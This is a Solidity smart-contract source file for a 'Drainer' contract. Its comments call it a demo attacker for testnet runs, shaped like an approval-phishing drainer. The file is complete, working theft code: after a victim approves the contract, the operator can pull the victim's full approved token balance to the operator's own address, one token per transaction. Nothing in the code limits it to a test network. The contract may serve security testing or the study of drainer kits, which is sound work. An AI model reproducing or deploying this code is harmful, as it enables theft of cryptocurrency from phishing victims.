// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}

/// @title Drainer
/// @author apeir
/// @notice Demo attacker for the testnet runs: the shape of an approval-phishing drainer. Once a victim has approved
///         it, its operator pulls one token per transaction, the way most drainer kits pace themselves.
contract Drainer {
    address public immutable OPERATOR;

    event Drained(address indexed token, address indexed victim, uint256 amount);

    error NotOperator();

    constructor() {
        OPERATOR = msg.sender;
    }

    /// @notice Pulls as much of `token_` from `victim_` as it can, to the operator.
    function drain(address token_, address victim_) external returns (uint256 amount_) {
        if (msg.sender != OPERATOR) revert NotOperator();
        IERC20Like t = IERC20Like(token_);
        uint256 bal = t.balanceOf(victim_);
        uint256 allowed = t.allowance(victim_, address(this));
        amount_ = bal < allowed ? bal : allowed;
        if (amount_ > 0) {
            require(t.transferFrom(victim_, OPERATOR, amount_), "transfer failed");
            emit Drained(token_, victim_, amount_);
        }
    }
}
